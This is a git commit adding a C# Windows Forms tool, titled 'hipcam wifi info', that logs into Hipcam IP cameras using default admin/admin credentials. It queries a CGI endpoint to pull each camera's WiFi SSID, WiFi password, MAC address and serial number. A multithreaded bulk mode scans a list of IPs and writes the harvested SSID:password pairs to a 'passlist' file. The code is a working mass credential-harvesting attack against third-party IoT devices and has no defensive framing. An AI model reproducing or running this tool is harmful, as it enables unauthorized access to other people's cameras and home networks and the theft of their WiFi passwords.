25b6a32930e2da727b00e9934c974ebb8e8e2cc1
jake hartley <puffleboy101@hotmail.co.uk>
2019-01-17 20:27:54 +0000

    -first commit

--- hipcam_wifi_downloader/Form1.Designer.cs
+++ hipcam_wifi_downloader/Form1.Designer.cs
@@ -28,13 +28,213 @@
         /// </summary>
         private void InitializeComponent()
         {
-            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.richTextBox1 = new System.Windows.Forms.RichTextBox();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.label4 = new System.Windows.Forms.Label();
+            this.button4 = new System.Windows.Forms.Button();
+            this.button5 = new System.Windows.Forms.Button();
+            this.groupBox1.SuspendLayout();
+            this.groupBox2.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // richTextBox1
+            // 
+            this.richTextBox1.Location = new System.Drawing.Point(246, 6);
+            this.richTextBox1.Name = "richTextBox1";
+            this.richTextBox1.ReadOnly = true;
+            this.richTextBox1.Size = new System.Drawing.Size(225, 223);
+            this.richTextBox1.TabIndex = 0;
+            this.richTextBox1.Text = "IP:\n-\n\nWIFI SSID:\n-\n\nWIFI PASSWORD:\n-\n\nMAC ADDRESS:\n-\n\nSERIAL NUMBER:\n-\n";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(50, 13);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(172, 20);
+            this.textBox1.TabIndex = 1;
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(50, 39);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(100, 20);
+            this.textBox2.TabIndex = 2;
+            this.textBox2.Text = "admin";
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(6, 16);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(20, 13);
+            this.label1.TabIndex = 3;
+            this.label1.Text = "IP:";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(4, 42);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(40, 13);
+            this.label2.TabIndex = 4;
+            this.label2.Text = "USER:";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(6, 68);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(38, 13);
+            this.label3.TabIndex = 5;
+            this.label3.Text = "PASS:";
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(50, 65);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(100, 20);
+            this.textBox3.TabIndex = 6;
+            this.textBox3.Text = "admin";
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(9, 91);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(213, 23);
+            this.button1.TabIndex = 7;
+            this.button1.Text = "get info";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.label1);
+            this.groupBox1.Controls.Add(this.textBox1);
+            this.groupBox1.Controls.Add(this.button1);
+            this.groupBox1.Controls.Add(this.textBox2);
+            this.groupBox1.Controls.Add(this.textBox3);
+            this.groupBox1.Controls.Add(this.label2);
+            this.groupBox1.Controls.Add(this.label3);
+            this.groupBox1.Location = new System.Drawing.Point(12, 12);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(228, 126);
+            this.groupBox1.TabIndex = 9;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Single";
+            // 
+            // groupBox2
+            // 
+            this.groupBox2.Controls.Add(this.button5);
+            this.groupBox2.Controls.Add(this.button4);
+            this.groupBox2.Controls.Add(this.label4);
+            this.groupBox2.Controls.Add(this.button2);
+            this.groupBox2.Controls.Add(this.button3);
+            this.groupBox2.Location = new System.Drawing.Point(12, 144);
+            this.groupBox2.Name = "groupBox2";
+            this.groupBox2.Size = new System.Drawing.Size(222, 85);
+            this.groupBox2.TabIndex = 10;
+            this.groupBox2.TabStop = false;
+            this.groupBox2.Text = "Bulk";
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(9, 19);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 11;
+            this.button2.Text = "INPUT";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(9, 47);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(75, 23);
+            this.button3.TabIndex = 12;
+            this.button3.Text = "OUTPUT";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Location = new System.Drawing.Point(156, 24);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(30, 13);
+            this.label4.TabIndex = 11;
+            this.label4.Text = "0 / 0";
+            // 
+            // button4
+            // 
+            this.button4.Location = new System.Drawing.Point(90, 47);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(126, 23);
+            this.button4.TabIndex = 13;
+            this.button4.Text = "PASSLIST OUTPUT";
+            this.button4.UseVisualStyleBackColor = true;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // button5
+            // 
+            this.button5.ForeColor = System.Drawing.Color.Red;
+            this.button5.Location = new System.Drawing.Point(90, 19);
+            this.button5.Name = "button5";
+            this.button5.Size = new System.Drawing.Size(60, 23);
+            this.button5.TabIndex = 14;
+            this.button5.Text = "START";
+            this.button5.UseVisualStyleBackColor = true;
+            this.button5.Click += new System.EventHandler(this.button5_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(800, 450);
-            this.Text = "Form1";
+            this.ClientSize = new System.Drawing.Size(483, 241);
+            this.Controls.Add(this.groupBox2);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.richTextBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.Text = "hipcam wifi info";
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.groupBox2.ResumeLayout(false);
+            this.groupBox2.PerformLayout();
+            this.ResumeLayout(false);
+
         }
 
         #endregion
+
+        private System.Windows.Forms.RichTextBox richTextBox1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.GroupBox groupBox2;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.Button button5;
     }
 }
 
--- hipcam_wifi_downloader/Form1.cs
+++ hipcam_wifi_downloader/Form1.cs
@@ -4,7 +4,9 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Net;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 
@@ -15,6 +17,214 @@ namespace hipcam_wifi_downloader
         public Form1()
         {
             InitializeComponent();
+        }
+
+        public class MyWebClient : WebClient
+        {
+            protected override WebRequest GetWebRequest(Uri address)
+            {
+                var req = base.GetWebRequest(address);
+                req.Timeout = 5000;
+                return req;
+            }
+        }
+
+        public string[] lines;
+        public int filelengh;
+        public string outputfilename;
+        public string passlistoutputfilename;
+        public bool wantsPasslist = false;
+        public List<string> data = new List<string> { "" };
+        public List<string> userpass = new List<string> { "" };
+        public int tested;
+
+        public void massTestThread(string[] iplist)
+        {
+            foreach (string line in iplist)
+            {
+                try
+                {
+                    Console.WriteLine(line);
+                    string temps = getIpData(line, true);
+                    this.Invoke(new MethodInvoker(delegate ()
+                    {
+                        richTextBox1.Text = temps;
+                    }));
+                }
+                catch
+                {
+                    //bad stuff happened
+                }
+
+            }      
+        }
+
+        public string getIpData(string ip, bool isUsingMass)
+        {
+            using (MyWebClient client = new MyWebClient())
+            {
+                tested++;
+                this.Invoke(new MethodInvoker(delegate ()
+                {
+                    label4.Text = tested + " / " + filelengh;
+                }));
+                string emptystr = "IP:\n " + "" + "\n\nWIFI SSID:\n" + "" + "\n\nWIFI PASSWORD:\n" + "" + "\n\nMAC ADDREDD:\n" + "" + "\n\nSERIAL NUMBER:\n" + "";
+                client.Credentials = new NetworkCredential(textBox2.Text, textBox3.Text);
+                string newip = ip;
+                if (!(newip.Contains("http://")))
+                {
+                    newip = "http://" + newip;
+                }
+                try
+                {
+                    string url = newip + "/cgi-bin/hi3510/param.cgi?cmd=getwirelessattr&cmd=getnetattr&cmd=gethip2pattr";
+                    byte[] clidata = client.DownloadData(url);
+                    Console.WriteLine(Encoding.UTF8.GetString(clidata));
+                    string outdata = Encoding.UTF8.GetString(clidata);
+                    string[] findata = outdata.Split(new string[] { "var" }, StringSplitOptions.None);
+                    Console.WriteLine(findata.Length);
+
+                    string tmpwifistr = "";
+                    string tmpkeystr = "";
+                    string tmpmacstr = "";
+                    string tmpsrlstr = "";
+                    string outputstr = "";
+
+                    for (int i = 0; i < findata.Length; i++)
+                    {
+
+                        Console.WriteLine(i);
+
+                        if (findata[i].Contains("wf_ssid"))
+                        {
+                            tmpwifistr = findata[i].Replace("wf_ssid=\"", "");
+                            tmpwifistr = tmpwifistr.Remove(tmpwifistr.Length - 4);
+                            Console.WriteLine(tmpwifistr);
+                        }
+
+                        if (findata[i].Contains("wf_key="))
+                        {
+                            tmpkeystr = findata[i].Replace("wf_key=\"", "");
+                            tmpkeystr = tmpkeystr.Remove(tmpkeystr.Length - 4);
+                            Console.WriteLine(tmpkeystr);
+                        }
+
+                        if (findata[i].Contains("macaddress="))
+                        {
+                            tmpmacstr = findata[i].Replace("macaddress=\"", "");
+                            tmpmacstr = tmpmacstr.Remove(tmpmacstr.Length - 4);
+                            Console.WriteLine(tmpmacstr);
+                        }
+
+                        if (findata[i].Contains("hip2p_uid="))
+                        {
+                            tmpsrlstr = findata[i].Replace("hip2p_uid=\"", "");
+                            tmpsrlstr = tmpsrlstr.Remove(tmpsrlstr.Length - 4);
+                            Console.WriteLine(tmpsrlstr);
+                        }
+                        //richTextBox1.Text = outputstr;
+                    }
+
+                    outputstr = "IP:\n " + ip + "\n\nWIFI SSID:\n" + tmpwifistr + "\n\nWIFI PASSWORD:\n" + tmpkeystr + "\n\nMAC ADDREDD:\n" + tmpmacstr + "\n\nSERIAL NUMBER:\n" + tmpsrlstr;
+                    data.Add(outputstr + "\n\n"); 
+                    if (!string.IsNullOrEmpty(tmpwifistr) && isUsingMass)
+                    {
+                        userpass.Add(tmpwifistr + " :" + tmpkeystr);
+                        System.IO.File.WriteAllText(outputfilename, string.Join("\n", data));
+                    }
+                    if (isUsingMass)
+                    {
+                        
+                        System.IO.File.WriteAllText(passlistoutputfilename, string.Join("\n", userpass));
+                    }
+                    return outputstr;
+                }
+                catch
+                {
+                    //badip
+                    return emptystr;
+                }
+            }
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            string ipdata = getIpData(textBox1.Text, false);
+            richTextBox1.Text = ipdata;
+
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog dlg = new OpenFileDialog())
+            {
+                dlg.Title = "Open Input File";
+                dlg.Filter = "Text Files | *.txt";
+
+                if (dlg.ShowDialog() == DialogResult.OK)
+                {
+                    string inputFileName = dlg.FileName;
+                    lines = System.IO.File.ReadAllLines(inputFileName);
+                    filelengh = lines.Count();
+                    label4.Text = "0 / " + filelengh;
+                    button2.ForeColor = System.Drawing.Color.DarkGreen;
+                }
+            }
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            using (SaveFileDialog dlg = new SaveFileDialog())
+            {
+                dlg.Title = "Open Output File";
+                dlg.Filter = "Text Files | *.txt";
+
+                if (dlg.ShowDialog() == DialogResult.OK)
+                {
+                    outputfilename = dlg.FileName;
+                    button3.ForeColor = System.Drawing.Color.DarkGreen;
+                }
+            }
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            using (SaveFileDialog dlg = new SaveFileDialog())
+            {
+                dlg.Title = "Open Passlist Output File";
+                dlg.Filter = "Text Files | *.txt";
+
+                if (dlg.ShowDialog() == DialogResult.OK)
+                {
+                    wantsPasslist = true;
+                    passlistoutputfilename = dlg.FileName;
+                    button4.ForeColor = System.Drawing.Color.DarkGreen;
+                }
+            }
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            string[] Ofirstsplit = lines.Take(lines.Length / 2).ToArray();
+            string[] Osecondsplit = lines.Skip(lines.Length / 2).ToArray();
+
+            string[] firstsplit = Ofirstsplit.Take(Ofirstsplit.Length / 2).ToArray();
+            string[] secondsplit = Ofirstsplit.Skip(Ofirstsplit.Length / 2).ToArray();
+            string[] thirdsplit = Osecondsplit.Take(Osecondsplit.Length / 2).ToArray();
+            string[] forthsplit = Osecondsplit.Skip(Osecondsplit.Length / 2).ToArray();
+
+            Thread a = new Thread(() => massTestThread(firstsplit));
+            Thread b = new Thread(() => massTestThread(secondsplit));
+            Thread c = new Thread(() => massTestThread(thirdsplit));
+            Thread d = new Thread(() => massTestThread(forthsplit));
+            a.IsBackground = true;
+            b.IsBackground = true;
+            c.IsBackground = true;
+            d.IsBackground = true;
+            a.Start();
+            b.Start();
+            c.Start();
+            d.Start();
         }
     }
 }
